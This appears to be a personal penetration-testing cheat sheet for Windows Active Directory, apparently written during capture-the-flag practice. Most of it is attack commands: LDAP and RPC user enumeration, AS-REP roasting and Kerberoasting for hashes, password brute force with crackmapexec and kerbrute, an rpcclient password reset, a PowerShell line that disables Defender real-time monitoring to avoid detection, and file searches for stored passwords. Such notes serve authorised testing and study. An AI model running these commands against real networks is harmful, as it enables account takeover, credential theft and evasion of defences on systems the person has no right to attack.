# For SMB and RPC stuff, use the IP in parameters, not the name you wrote in /etc/hosts

## Ldap

```
nmap -n -sV -script "ldap*" -p 389 <ip>

ldapsearch -LLL -x -h <ip> -b '' -s base '(objectclass=*)'

ldapsearch -h <ip> -x -s base namingcontexts
ldapsearch -h <ip> -x -b 'DC=fzefze,DC=fzef' > ldap.txt
ldapsearch -h <ip> -x -b <result> '(objectClass=Person)'
ldapsearch -h <ip> -x -b <result> '(objectClass=Person)' saMAccountName

ldapsearch -h 10.10.10.182 -x -s sub -b "DC=cascade,DC=local"
```


---

## RPC Windows (port 135) 

- For SMB stuffs and rpc, do not use the name you use in the etc hosts file, enter the IP

- ```rpcclient -U "" <ip>```
- ```enumdomusers```
- ```queryuser <id>``` (for example 0x1f4)
- ```querydispinfo```
- ```enumprinters```

- Found user's group : ```enumalsgroups builtin(or domain)```
- ```queryaliasmem builtin(or domain) <rid>```
- ```lookupsids <sid>```

- ```privs``` enumerate the privilege of the current user.

- modify a password if you have the good rights : ```setuserinfo2 <user> 23 '<password>'```


- about 23 : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN

- If you found new users, reunenumerate everything.

---

## Find TGTs for users

- This script will attempt to list and get TGTs for those users that have the property
'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).

`GetNPUsers <domain> -usersfile user.txt -dc-ip ip`

---

## Enumerate policies in windows

- `crackmapexec smb <ip> --pass-pol -u '' -p ''`
- if you have threshold to 0, you can bruteforce without locking account

---

## Bruteforce account password on windows

- `crackmapexec smb <ip> -u userlist.txt -p passwords.txt -m UAC` 
- `kerbrute`

---

## Automated enumeration

- Scripts : `winpeas`

- Use bloodhound and sharphound Upload sharphound (in bloodhound/ingestors) (do not forget, you have to use it with a domain account, and the cred inside should be a local administrator)

Upload invoke-kerberoast.ps1 (from empire) to kerberoast a couple of hashes. To avoid defender use : Set-MpPreference -DisableRealtimeMonitoring $true (Same as sharphound, needs domain account)
: powershell -c "import-module c:\programdata\invoke-kerberoast.ps1; invoke-kerberoast -outputformat hashcat"
or without powershell -c


---

## Bypass restrictions

![3fae2301aeb3a1521f2b31d80748d0da.png](../../_resources/e5edde8c3c054d3b94dee3ef14feb4d2.png)

Create a file, open it, enter cmd.exe inside, and save it as cmd.bat.

---


## Enumerate policies in windows

- ```crackmapexec smb ip --pass-pol -u '' -p '' ```
- if you have threshold to 0, you can bruteforce without locking account

---

## Bruteforce account password on windows

- `crackmapexec smb ip -u userlist.txt -p passwords.txt`

---

## Enumerate files with special extensions in a folder

`dir .bat* /B /S /a`

- try txt, xml, ini, php, py, aspx (I think that's all ?)

---

## Find password or user in file

`findstr /spin "password" *.*`
